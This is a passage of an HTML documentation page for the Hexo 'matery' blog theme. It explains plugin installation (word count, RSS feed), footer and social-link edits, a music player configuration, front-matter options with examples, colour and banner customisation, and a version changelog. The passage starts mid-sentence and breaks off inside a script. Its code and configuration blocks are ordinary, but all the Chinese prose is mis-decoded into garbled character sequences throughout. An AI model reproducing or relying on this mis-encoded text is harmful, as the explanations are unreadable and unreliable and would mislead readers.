æ’ä»¶ä¹Ÿå¯ä»¥ç”Ÿæˆéä¸­æ–‡çš„é“¾æ¥ã€‚</p></blockquote><h3 id="æ–‡ç« å­—æ•°ç»Ÿè®¡æ’ä»¶ï¼ˆå¯é€‰çš„ï¼‰"><a href="#æ–‡ç« å­—æ•°ç»Ÿè®¡æ’ä»¶ï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="æ–‡ç« å­—æ•°ç»Ÿè®¡æ’ä»¶ï¼ˆå¯é€‰çš„ï¼‰"></a>æ–‡ç« å­—æ•°ç»Ÿè®¡æ’ä»¶ï¼ˆå¯é€‰çš„ï¼‰</h3><p>å¦‚æœä½ æƒ³è¦åœ¨æ–‡ç« ä¸­æ˜¾ç¤ºæ–‡ç« å­—æ•°ã€é˜…è¯»æ—¶é•¿ä¿¡æ¯ï¼Œå¯ä»¥å®‰è£… <a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">hexo-wordcount</a>æ’ä»¶ã€‚</p><p>å®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i --save hexo-wordcount</code></pre><p>ç„¶ååªéœ€åœ¨æœ¬ä¸»é¢˜ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œæ¿€æ´»ä»¥ä¸‹é…ç½®é¡¹å³å¯ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">wordCount:  enable: false # å°†è¿™ä¸ªå€¼è®¾ç½®ä¸º true å³å¯.  postWordCount: true  min2read: true  totalCount: true</code></pre><h3 id="æ·»åŠ -RSS-è®¢é˜…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰"><a href="#æ·»åŠ -RSS-è®¢é˜…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="æ·»åŠ  RSS è®¢é˜…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰"></a>æ·»åŠ  RSS è®¢é˜…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰</h3><p>æœ¬ä¸»é¢˜ä¸­è¿˜ä½¿ç”¨åˆ°äº† <a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> çš„ Hexo æ’ä»¶æ¥åš <code>RSS</code>ï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm install hexo-generator-feed --save</code></pre><p>åœ¨ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œæ–°å¢ä»¥ä¸‹çš„é…ç½®é¡¹ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">feed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: ' '  order_by: -date</code></pre><p>æ‰§è¡Œ <code>hexo clean &amp;&amp; hexo g</code> é‡æ–°ç”Ÿæˆåšå®¢æ–‡ä»¶ï¼Œç„¶ååœ¨ <code>public</code> æ–‡ä»¶å¤¹ä¸­å³å¯çœ‹åˆ° <code>atom.xml</code> æ–‡ä»¶ï¼Œè¯´æ˜ä½ å·²ç»å®‰è£…æˆåŠŸäº†ã€‚</p><h3 id="ä¿®æ”¹é¡µè„š"><a href="#ä¿®æ”¹é¡µè„š" class="headerlink" title="ä¿®æ”¹é¡µè„š"></a>ä¿®æ”¹é¡µè„š</h3><p>é¡µè„šä¿¡æ¯å¯èƒ½éœ€è¦åšå®šåˆ¶åŒ–ä¿®æ”¹ï¼Œè€Œä¸”å®ƒä¸ä¾¿äºåšæˆé…ç½®ä¿¡æ¯ï¼Œæ‰€ä»¥å¯èƒ½éœ€è¦ä½ è‡ªå·±å»å†ä¿®æ”¹å’ŒåŠ å·¥ã€‚ä¿®æ”¹çš„åœ°æ–¹åœ¨ä¸»é¢˜æ–‡ä»¶çš„ <code>/layout/_partial/footer.ejs</code> æ–‡ä»¶ä¸­ï¼ŒåŒ…æ‹¬ç«™ç‚¹ã€ä½¿ç”¨çš„ä¸»é¢˜ã€è®¿é—®é‡ç­‰ã€‚</p><h3 id="ä¿®æ”¹ç¤¾äº¤é“¾æ¥"><a href="#ä¿®æ”¹ç¤¾äº¤é“¾æ¥" class="headerlink" title="ä¿®æ”¹ç¤¾äº¤é“¾æ¥"></a>ä¿®æ”¹ç¤¾äº¤é“¾æ¥</h3><p>åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œé»˜è®¤æ”¯æŒ <code>QQ</code>ã€<code>GitHub</code> å’Œé‚®ç®±çš„é…ç½®ï¼Œä½ å¯ä»¥åœ¨ä¸»é¢˜æ–‡ä»¶çš„ <code>/layout/_partial/social-link.ejs</code> æ–‡ä»¶ä¸­ï¼Œæ–°å¢ã€ä¿®æ”¹ä½ éœ€è¦çš„ç¤¾äº¤é“¾æ¥åœ°å€ï¼Œå¢åŠ é“¾æ¥å¯å‚è€ƒå¦‚ä¸‹ä»£ç ï¼š</p><pre class=" language-lang-html"><code class="language-lang-html"><a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">    <i class="fa fa-github"></i></a></code></pre><p>å…¶ä¸­ï¼Œç¤¾äº¤å›¾æ ‡ï¼ˆå¦‚ï¼š<code>fa-github</code>ï¼‰ä½ å¯ä»¥åœ¨ <a href="https://fontawesome.com/icons" target="_blank" rel="noopener">Font Awesome</a> ä¸­æœç´¢æ‰¾åˆ°ã€‚ä»¥ä¸‹æ˜¯å¸¸ç”¨ç¤¾äº¤å›¾æ ‡çš„æ ‡è¯†ï¼Œä¾›ä½ å‚è€ƒï¼š</p><ul><li>Facebook: <code>fa-facebook</code></li><li>Twitter: <code>fa-twitter</code></li><li>Google-plus: <code>fa-google-plus</code></li><li>Linkedin: <code>fa-linkedin</code></li><li>Tumblr: <code>fa-tumblr</code></li><li>Medium: <code>fa-medium</code></li><li>Slack: <code>fa-slack</code></li><li>æ–°æµªå¾®åš: <code>fa-weibo</code></li><li>å¾®ä¿¡: <code>fa-wechat</code></li><li>QQ: <code>fa-qq</code></li></ul><blockquote><p><strong>æ³¨æ„</strong>: æœ¬ä¸»é¢˜ä¸­ä½¿ç”¨çš„ <code>Font Awesome</code> ç‰ˆæœ¬ä¸º <code>4.7.0</code>ã€‚</p></blockquote><h3 id="ä¿®æ”¹æ‰“èµçš„äºŒç»´ç å›¾ç‰‡"><a href="#ä¿®æ”¹æ‰“èµçš„äºŒç»´ç å›¾ç‰‡" class="headerlink" title="ä¿®æ”¹æ‰“èµçš„äºŒç»´ç å›¾ç‰‡"></a>ä¿®æ”¹æ‰“èµçš„äºŒç»´ç å›¾ç‰‡</h3><p>åœ¨ä¸»é¢˜æ–‡ä»¶çš„ <code>source/medias/reward</code> æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥æ›¿æ¢æˆä½ çš„çš„å¾®ä¿¡å’Œæ”¯ä»˜å®çš„æ‰“èµäºŒç»´ç å›¾ç‰‡ã€‚</p><h3 id="é…ç½®éŸ³ä¹æ’­æ”¾å™¨ï¼ˆå¯é€‰çš„ï¼‰"><a href="#é…ç½®éŸ³ä¹æ’­æ”¾å™¨ï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="é…ç½®éŸ³ä¹æ’­æ”¾å™¨ï¼ˆå¯é€‰çš„ï¼‰"></a>é…ç½®éŸ³ä¹æ’­æ”¾å™¨ï¼ˆå¯é€‰çš„ï¼‰</h3><p>è¦æ”¯æŒéŸ³ä¹æ’­æ”¾ï¼Œå°±å¿…é¡»å¼€å¯éŸ³ä¹çš„æ’­æ”¾é…ç½®å’ŒéŸ³ä¹æ•°æ®çš„æ–‡ä»¶ã€‚</p><p>é¦–å…ˆï¼Œåœ¨ä½ çš„åšå®¢ <code>source</code> ç›®å½•ä¸‹çš„ <code>_data</code> ç›®å½•ï¼ˆæ²¡æœ‰çš„è¯å°±æ–°å»ºä¸€ä¸ªï¼‰ä¸­æ–°å»º <code>musics.json</code> æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class=" language-lang-json"><code class="language-lang-json">[{    "name": "äº”æœˆé›¨å˜å¥ç”µéŸ³",    "artist": "AnimeVibe",    "url": "http://xxx.com/music1.mp3",    "cover": "http://xxx.com/music-cover1.png"}, {    "name": "Take me hand",    "artist": "DAISHI DANCE,Cecile Corbel",    "url": "/medias/music/music2.mp3",    "cover": "/medias/music/cover2.png"}, {    "name": "Shape of You",    "artist": "J.Fla",    "url": "http://xxx.com/music3.mp3",    "cover": "http://xxx.com/music-cover3.png"}]</code></pre><blockquote><p><strong>æ³¨</strong>ï¼šä»¥ä¸Š JSON ä¸­çš„å±æ€§ï¼š<code>name</code>ã€<code>artist</code>ã€<code>url</code>ã€<code>cover</code> åˆ†åˆ«è¡¨ç¤ºéŸ³ä¹çš„åç§°ã€ä½œè€…ã€éŸ³ä¹æ–‡ä»¶åœ°å€ã€éŸ³ä¹å°é¢ã€‚</p></blockquote><p>ç„¶åï¼Œåœ¨ä¸»é¢˜çš„ <code>_config.yml</code> é…ç½®æ–‡ä»¶ä¸­æ¿€æ´»é…ç½®å³å¯ï¼š</p><pre class=" language-lang-yaml"><code class="language-lang-yaml"># æ˜¯å¦åœ¨é¦–é¡µæ˜¾ç¤ºéŸ³ä¹.music:  enable: true  showTitle: false  title: å¬å¬éŸ³ä¹  fixed: false # æ˜¯å¦å¼€å¯å¸åº•æ¨¡å¼  autoplay: false # æ˜¯å¦è‡ªåŠ¨æ’­æ”¾  theme: '#42b983'  loop: 'all' # éŸ³é¢‘å¾ªç¯æ’­æ”¾, å¯é€‰å€¼: 'all', 'one', 'none'  order: 'list' # éŸ³é¢‘å¾ªç¯é¡ºåº, å¯é€‰å€¼: 'list', 'random'  preload: 'auto' # é¢„åŠ è½½ï¼Œå¯é€‰å€¼: 'none', 'metadata', 'auto'  volume: 0.7 # é»˜è®¤éŸ³é‡ï¼Œè¯·æ³¨æ„æ’­æ”¾å™¨ä¼šè®°å¿†ç”¨æˆ·è®¾ç½®ï¼Œç”¨æˆ·æ‰‹åŠ¨è®¾ç½®éŸ³é‡åé»˜è®¤éŸ³é‡å³å¤±æ•ˆ  listFolded: false # åˆ—è¡¨é»˜è®¤æŠ˜å   listMaxHeight: # åˆ—è¡¨æœ€å¤§é«˜åº¦</code></pre><h2 id="æ–‡ç« -Front-matter-ä»‹ç»"><a href="#æ–‡ç« -Front-matter-ä»‹ç»" class="headerlink" title="æ–‡ç«  Front-matter ä»‹ç»"></a>æ–‡ç«  Front-matter ä»‹ç»</h2><h3 id="Front-matter-é€‰é¡¹è¯¦è§£"><a href="#Front-matter-é€‰é¡¹è¯¦è§£" class="headerlink" title="Front-matter é€‰é¡¹è¯¦è§£"></a>Front-matter é€‰é¡¹è¯¦è§£</h3><p><code>Front-matter</code> é€‰é¡¹ä¸­çš„æ‰€æœ‰å†…å®¹å‡ä¸º<strong>éå¿…å¡«</strong>çš„ã€‚ä½†æˆ‘ä»ç„¶å»ºè®®è‡³å°‘å¡«å†™ <code>title</code> å’Œ <code>date</code> çš„å€¼ã€‚</p><div class="table-container"><table><thead><tr><th>é…ç½®é€‰é¡¹</th><th>é»˜è®¤å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> çš„æ–‡ä»¶æ ‡é¢˜</td><td>æ–‡ç« æ ‡é¢˜ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹</td></tr><tr><td>date</td><td>æ–‡ä»¶åˆ›å»ºæ—¶çš„æ—¥æœŸæ—¶é—´</td><td>å‘å¸ƒæ—¶é—´ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹ï¼Œä¸”æœ€å¥½ä¿è¯å…¨å±€å”¯ä¸€</td></tr><tr><td>author</td><td>æ ¹ <code>_config.yml</code> ä¸­çš„ <code>author</code></td><td>æ–‡ç« ä½œè€…</td></tr><tr><td>img</td><td><code>featureImages</code> ä¸­çš„æŸä¸ªå€¼</td><td>æ–‡ç« ç‰¹å¾å›¾ï¼Œæ¨èä½¿ç”¨å›¾åºŠ(è…¾è®¯äº‘ã€ä¸ƒç‰›äº‘ã€åˆæ‹äº‘ç­‰)æ¥åšå›¾ç‰‡çš„è·¯å¾„.å¦‚: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>æ¨èæ–‡ç« ï¼ˆæ–‡ç« æ˜¯å¦ç½®é¡¶ï¼‰ï¼Œå¦‚æœ <code>top</code> å€¼ä¸º <code>true</code>ï¼Œåˆ™ä¼šä½œä¸ºé¦–é¡µæ¨èæ–‡ç« </td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« æ˜¯å¦éœ€è¦åŠ å…¥åˆ°é¦–é¡µè½®æ’­å°é¢ä¸­</td></tr><tr><td>coverImg</td><td>æ— </td><td><code>v1.0.2</code>ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« åœ¨é¦–é¡µè½®æ’­å°é¢éœ€è¦æ˜¾ç¤ºçš„å›¾ç‰‡è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™é»˜è®¤ä½¿ç”¨æ–‡ç« çš„ç‰¹è‰²å›¾ç‰‡</td></tr><tr><td>password</td><td>æ— </td><td>æ–‡ç« é˜…è¯»å¯†ç ï¼Œå¦‚æœè¦å¯¹æ–‡ç« è®¾ç½®é˜…è¯»éªŒè¯å¯†ç çš„è¯ï¼Œå°±å¯ä»¥è®¾ç½® <code>password</code> çš„å€¼ï¼Œè¯¥å€¼å¿…é¡»æ˜¯ç”¨ <code>SHA256</code> åŠ å¯†åçš„å¯†ç ï¼Œé˜²æ­¢è¢«ä»–äººè¯†ç ´ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ <code>config.yml</code> ä¸­æ¿€æ´»äº† <code>verifyPassword</code> é€‰é¡¹</td></tr><tr><td>toc</td><td><code>true</code></td><td>æ˜¯å¦å¼€å¯ TOCï¼Œå¯ä»¥é’ˆå¯¹æŸç¯‡æ–‡ç« å•ç‹¬å…³é—­ TOC çš„åŠŸèƒ½ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ <code>config.yml</code> ä¸­æ¿€æ´»äº† <code>toc</code> é€‰é¡¹</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>æ˜¯å¦å¼€å¯æ•°å­¦å…¬å¼æ”¯æŒ ï¼Œæœ¬æ–‡ç« æ˜¯å¦å¼€å¯ <code>mathjax</code>ï¼Œä¸”éœ€è¦åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ä¹Ÿéœ€è¦å¼€å¯æ‰è¡Œ</td></tr><tr><td>summary</td><td>æ— </td><td>æ–‡ç« æ‘˜è¦ï¼Œè‡ªå®šä¹‰çš„æ–‡ç« æ‘˜è¦å†…å®¹ï¼Œå¦‚æœè¿™ä¸ªå±æ€§æœ‰å€¼ï¼Œæ–‡ç« å¡ç‰‡æ‘˜è¦å°±æ˜¾ç¤ºè¿™æ®µæ–‡å­—ï¼Œå¦åˆ™ç¨‹åºä¼šè‡ªåŠ¨æˆªå–æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ä½œä¸ºæ‘˜è¦</td></tr><tr><td>categories</td><td>æ— </td><td>æ–‡ç« åˆ†ç±»ï¼Œæœ¬ä¸»é¢˜çš„åˆ†ç±»è¡¨ç¤ºå®è§‚ä¸Šå¤§çš„åˆ†ç±»ï¼Œåªå»ºè®®ä¸€ç¯‡æ–‡ç« ä¸€ä¸ªåˆ†ç±»</td></tr><tr><td>tags</td><td>æ— </td><td>æ–‡ç« æ ‡ç­¾ï¼Œä¸€ç¯‡æ–‡ç« å¯ä»¥å¤šä¸ªæ ‡ç­¾</td></tr></tbody></table></div><blockquote><p><strong>æ³¨æ„</strong>:</p><ol><li>å¦‚æœ <code>img</code> å±æ€§ä¸å¡«å†™çš„è¯ï¼Œæ–‡ç« ç‰¹è‰²å›¾ä¼šæ ¹æ®æ–‡ç« æ ‡é¢˜çš„ <code>hashcode</code> çš„å€¼å–ä½™ï¼Œç„¶åé€‰å–ä¸»é¢˜ä¸­å¯¹åº”çš„ç‰¹è‰²å›¾ç‰‡ï¼Œä»è€Œè¾¾åˆ°è®©æ‰€æœ‰æ–‡ç« éƒ½çš„ç‰¹è‰²å›¾<strong>å„æœ‰ç‰¹è‰²</strong>ã€‚</li><li><code>date</code> çš„å€¼å°½é‡ä¿è¯æ¯ç¯‡æ–‡ç« æ˜¯å”¯ä¸€çš„ï¼Œå› ä¸ºæœ¬ä¸»é¢˜ä¸­ <code>Gitalk</code> å’Œ <code>Gitment</code> è¯†åˆ« <code>id</code> æ˜¯é€šè¿‡ <code>date</code> çš„å€¼æ¥ä½œä¸ºå”¯ä¸€æ ‡è¯†çš„ã€‚</li><li>å¦‚æœè¦å¯¹æ–‡ç« è®¾ç½®é˜…è¯»éªŒè¯å¯†ç çš„åŠŸèƒ½ï¼Œä¸ä»…è¦åœ¨ Front-matter ä¸­è®¾ç½®é‡‡ç”¨äº† SHA256 åŠ å¯†çš„ password çš„å€¼ï¼Œè¿˜éœ€è¦åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> ä¸­æ¿€æ´»äº†é…ç½®ã€‚æœ‰äº›åœ¨çº¿çš„ SHA256 åŠ å¯†çš„åœ°å€ï¼Œå¯ä¾›ä½ ä½¿ç”¨ï¼š<a href="http://tool.oschina.net/encrypt?type=2" target="_blank" rel="noopener">å¼€æºä¸­å›½åœ¨çº¿å·¥å…·</a>ã€<a href="http://encode.chahuo.com/" target="_blank" rel="noopener">chahuo</a>ã€<a href="http://tool.chinaz.com/tools/hash.aspx" target="_blank" rel="noopener">ç«™é•¿å·¥å…·</a>ã€‚</li></ol></blockquote><p>ä»¥ä¸‹ä¸ºæ–‡ç« çš„ <code>Front-matter</code> ç¤ºä¾‹ã€‚</p><h3 id="æœ€ç®€ç¤ºä¾‹"><a href="#æœ€ç®€ç¤ºä¾‹" class="headerlink" title="æœ€ç®€ç¤ºä¾‹"></a>æœ€ç®€ç¤ºä¾‹</h3><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: typora-vue-themeä¸»é¢˜ä»‹ç»date: 2018-09-07 09:25:00---</code></pre><h3 id="æœ€å…¨ç¤ºä¾‹"><a href="#æœ€å…¨ç¤ºä¾‹" class="headerlink" title="æœ€å…¨ç¤ºä¾‹"></a>æœ€å…¨ç¤ºä¾‹</h3><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: typora-vue-themeä¸»é¢˜ä»‹ç»date: 2018-09-07 09:25:00author: èµµå¥‡img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: è¿™æ˜¯ä½ è‡ªå®šä¹‰çš„æ–‡ç« æ‘˜è¦å†…å®¹ï¼Œå¦‚æœè¿™ä¸ªå±æ€§æœ‰å€¼ï¼Œæ–‡ç« å¡ç‰‡æ‘˜è¦å°±æ˜¾ç¤ºè¿™æ®µæ–‡å­—ï¼Œå¦åˆ™ç¨‹åºä¼šè‡ªåŠ¨æˆªå–æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ä½œä¸ºæ‘˜è¦categories: Markdowntags:  - Typora  - Markdown---</code></pre><h2 id="æ•ˆæœæˆªå›¾"><a href="#æ•ˆæœæˆªå›¾" class="headerlink" title="æ•ˆæœæˆªå›¾"></a>æ•ˆæœæˆªå›¾</h2><p><img src="http://static.blinkfox.com/matery-20181202-1.png" alt="é¦–é¡µ"></p><p><img src="http://static.blinkfox.com/matery-20181202-2.png" alt="é¦–é¡µæ¨èæ–‡ç« "></p><p><img src="http://static.blinkfox.com/matery-20181202-3.png" alt="é¦–é¡µæ–‡ç« åˆ—è¡¨"></p><p><img src="http://static.blinkfox.com/matery-20181202-7.png" alt="é¦–é¡µæ–‡ç« åˆ—è¡¨"></p><p><img src="http://static.blinkfox.com/matery-20181202-8.png" alt="é¦–é¡µæ–‡ç« åˆ—è¡¨"></p><h2 id="è‡ªå®šåˆ¶ä¿®æ”¹"><a href="#è‡ªå®šåˆ¶ä¿®æ”¹" class="headerlink" title="è‡ªå®šåˆ¶ä¿®æ”¹"></a>è‡ªå®šåˆ¶ä¿®æ”¹</h2><p>åœ¨æœ¬ä¸»é¢˜çš„ <code>_config.yml</code> ä¸­å¯ä»¥ä¿®æ”¹éƒ¨åˆ†è‡ªå®šä¹‰ä¿¡æ¯ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>èœå•</li><li>æˆ‘çš„æ¢¦æƒ³</li><li>é¦–é¡µçš„éŸ³ä¹æ’­æ”¾å™¨å’Œè§†é¢‘æ’­æ”¾å™¨é…ç½®</li><li>æ˜¯å¦æ˜¾ç¤ºæ¨èæ–‡ç« åç§°å’ŒæŒ‰é’®é…ç½®</li><li><code>favicon</code> å’Œ <code>Logo</code></li><li>ä¸ªäººä¿¡æ¯</li><li>TOC ç›®å½•</li><li>æ–‡ç« æ‰“èµä¿¡æ¯</li><li>å¤åˆ¶æ–‡ç« å†…å®¹æ—¶è¿½åŠ ç‰ˆæƒä¿¡æ¯</li><li>MathJax</li><li>æ–‡ç« å­—æ•°ç»Ÿè®¡ã€é˜…è¯»æ—¶é•¿</li><li>ç‚¹å‡»é¡µé¢çš„â€™çˆ±å¿ƒâ€™æ•ˆæœ</li><li>æˆ‘çš„é¡¹ç›®</li><li>æˆ‘çš„æŠ€èƒ½</li><li>æˆ‘çš„ç›¸å†Œ</li><li><code>Gitalk</code>ã€<code>Gitment</code>ã€<code>Valine</code> å’Œ <code>disqus</code> è¯„è®ºé…ç½®</li><li><a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">ä¸è’œå­ç»Ÿè®¡</a>å’Œè°·æ­Œåˆ†æï¼ˆ<code>Google Analytics</code>ï¼‰</li><li>é»˜è®¤ç‰¹è‰²å›¾çš„é›†åˆã€‚å½“æ–‡ç« æ²¡æœ‰è®¾ç½®ç‰¹è‰²å›¾æ—¶ï¼Œæœ¬ä¸»é¢˜ä¼šæ ¹æ®æ–‡ç« æ ‡é¢˜çš„ <code>hashcode</code> å€¼å–ä½™ï¼Œæ¥é€‰æ‹©å±•ç¤ºå¯¹åº”çš„ç‰¹è‰²å›¾</li></ul><p><strong>æˆ‘è®¤ä¸ºä¸ªäººåšå®¢åº”è¯¥éƒ½æœ‰è‡ªå·±çš„é£æ ¼å’Œç‰¹è‰²</strong>ã€‚å¦‚æœæœ¬ä¸»é¢˜ä¸­çš„è¯¸å¤šåŠŸèƒ½å’Œä¸»é¢˜è‰²å½©ä½ ä¸æ»¡æ„ï¼Œå¯ä»¥åœ¨ä¸»é¢˜ä¸­è‡ªå®šä¹‰ä¿®æ”¹ï¼Œå¾ˆå¤šæ›´è‡ªç”±çš„åŠŸèƒ½å’Œç»†èŠ‚ç‚¹çš„ä¿®æ”¹éš¾ä»¥åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> ä¸­å®Œæˆï¼Œéœ€è¦ä¿®æ”¹æºä»£ç æ‰æ¥å®Œæˆã€‚ä»¥ä¸‹åˆ—å‡ºäº†å¯èƒ½å¯¹ä½ æœ‰ç”¨çš„åœ°æ–¹ï¼š</p><h3 id="ä¿®æ”¹ä¸»é¢˜é¢œè‰²"><a href="#ä¿®æ”¹ä¸»é¢˜é¢œè‰²" class="headerlink" title="ä¿®æ”¹ä¸»é¢˜é¢œè‰²"></a>ä¿®æ”¹ä¸»é¢˜é¢œè‰²</h3><p>åœ¨ä¸»é¢˜æ–‡ä»¶çš„ <code>/source/css/matery.css</code> æ–‡ä»¶ä¸­ï¼Œæœç´¢ <code>.bg-color</code> æ¥ä¿®æ”¹èƒŒæ™¯é¢œè‰²ï¼š</p><pre class=" language-lang-css"><code class="language-lang-css">/* æ•´ä½“èƒŒæ™¯é¢œè‰²ï¼ŒåŒ…æ‹¬å¯¼èˆªã€ç§»åŠ¨ç«¯çš„å¯¼èˆªã€é¡µå°¾ã€æ ‡ç­¾é¡µç­‰çš„èƒŒæ™¯é¢œè‰². */.bg-color {    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);}@-webkit-keyframes rainbow {   /* åŠ¨æ€åˆ‡æ¢èƒŒæ™¯é¢œè‰². */}@keyframes rainbow {    /* åŠ¨æ€åˆ‡æ¢èƒŒæ™¯é¢œè‰². */}</code></pre><h3 id="ä¿®æ”¹-banner-å›¾å’Œæ–‡ç« ç‰¹è‰²å›¾"><a href="#ä¿®æ”¹-banner-å›¾å’Œæ–‡ç« ç‰¹è‰²å›¾" class="headerlink" title="ä¿®æ”¹ banner å›¾å’Œæ–‡ç« ç‰¹è‰²å›¾"></a>ä¿®æ”¹ banner å›¾å’Œæ–‡ç« ç‰¹è‰²å›¾</h3><p>ä½ å¯ä»¥ç›´æ¥åœ¨ <code>/source/medias/banner</code> æ–‡ä»¶å¤¹ä¸­æ›´æ¢ä½ å–œæ¬¢çš„ <code>banner</code> å›¾ç‰‡ï¼Œä¸»é¢˜ä»£ç ä¸­æ˜¯æ¯å¤©åŠ¨æ€åˆ‡æ¢ä¸€å¼ ï¼Œåªéœ€ <code>7</code> å¼ å³å¯ã€‚å¦‚æœä½ ä¼š <code>JavaScript</code> ä»£ç ï¼Œå¯ä»¥ä¿®æ”¹æˆä½ è‡ªå·±å–œæ¬¢åˆ‡æ¢é€»è¾‘ï¼Œå¦‚ï¼šéšæœºåˆ‡æ¢ç­‰ï¼Œ<code>banner</code> åˆ‡æ¢çš„ä»£ç ä½ç½®åœ¨ <code>/layout/_partial/bg-cover-content.ejs</code> æ–‡ä»¶çš„ <code>&lt;script&gt;&lt;/script&gt;</code> ä»£ç ä¸­ï¼š</p><pre class=" language-lang-javascript"><code class="language-lang-javascript">$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');</code></pre><p>åœ¨ <code>/source/medias/featureimages</code> æ–‡ä»¶å¤¹ä¸­é»˜è®¤æœ‰ 24 å¼ ç‰¹è‰²å›¾ç‰‡ï¼Œä½ å¯ä»¥å†å¢åŠ æˆ–è€…å‡å°‘ï¼Œå¹¶éœ€è¦åœ¨ <code>_config.yml</code> åšåŒæ­¥ä¿®æ”¹ã€‚</p><h2 id="ç‰ˆæœ¬è®°å½•"><a href="#ç‰ˆæœ¬è®°å½•" class="headerlink" title="ç‰ˆæœ¬è®°å½•"></a>ç‰ˆæœ¬è®°å½•</h2><ul><li>v1.0.0<ul><li>æ–°å¢äº†æ‰€æœ‰åŸºç¡€åŠŸèƒ½ï¼›</li></ul></li><li>v1.0.1<ul><li>è°ƒæ•´ <code>css</code>ã€<code>js</code> çš„æ–‡ä»¶è¯·æ±‚è·¯å¾„åœ¨ä¸»é¢˜çš„<code>_config.yml</code>ä¸­é…ç½®ï¼Œä¾¿äºä½ æ›´å¿«æ·çš„é…ç½®è‡ªå·±çš„ CDNï¼›</li><li>æ–°å¢ä»£ç æ˜¯å¦æŠ˜è¡Œä¸ºå¯é…ç½®ï¼Œé»˜è®¤ä¸ºæŠ˜è¡Œï¼›</li><li>é»˜è®¤æ¿€æ´» <code>TOC</code> åŠŸèƒ½ï¼Œå¹¶æ–°å¢ä¸ºæŸç¯‡æ–‡ç« å…³é—­ <code>TOC</code> çš„ <code>Front-matter</code> é…ç½®é€‰é¡¹ï¼›</li><li>ä¿®å¤æ–‡ç« æ»šåŠ¨æ—¶ï¼Œé«˜äº®çš„ç›®å½•é€‰é¡¹ä¸å‡†ç¡®çš„é—®é¢˜ï¼›</li><li><code>IOS</code>ä¸‹ç§»é™¤æœç´¢æ¡†è‡ªåŠ¨è·å¾—ç„¦ç‚¹å±æ€§ï¼Œé˜²æ­¢è‡ªåŠ¨è·å¾—ç„¦ç‚¹åå¯¼è‡´è§†å›¾ä¸Šç§»ï¼›</li></ul></li><li>v1.0.2<ul><li>å‡çº§äº† <a href="https://materializecss.com/" target="_blank" rel="noopener">Materialize</a> æ¡†æ¶ç‰ˆæœ¬ä¸º<code>1.0.0</code>ï¼Œé‡æ„å’Œä¿®æ”¹äº†å‡çº§è¿‡ç¨‹ä¸­çš„éƒ¨åˆ†æ–‡ä»¶æˆ–é—®é¢˜ï¼›</li><li>æ–°å¢äº†é¦–é¡µå°é¢çš„å…¨å±è½®æ’­ç‰¹æ•ˆï¼Œå¯ä»¥å°†æ›´é‡è¦çš„æ–‡ç« è®¾ç½®åˆ°é¦–é¡µè½®æ’­ä¸­ï¼›</li><li>ä¿®å¤é¦–é¡µç¬¬ä¸€ä¸ªæŒ‰é’®æ˜¯ä¸­æ–‡çš„é—®é¢˜</li><li>ä¿®å¤äº† iPhone ä¸Šç‚¹å‡»æœç´¢è¾“å…¥è·å–ç„¦ç‚¹çš„é—®é¢˜ï¼›</li><li>ä¿®å¤äº† iPhone ä¸Šè¾“å…¥æ¡†è·å–ç„¦ç‚¹åé¡µé¢æ”¾å¤§çš„é—®é¢˜ï¼›</li><li>ä¿®å¤ä¸€äº›æ–‡ç« æˆ– UI æ˜¾ç¤ºé—®é¢˜ï¼›</li></ul></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style 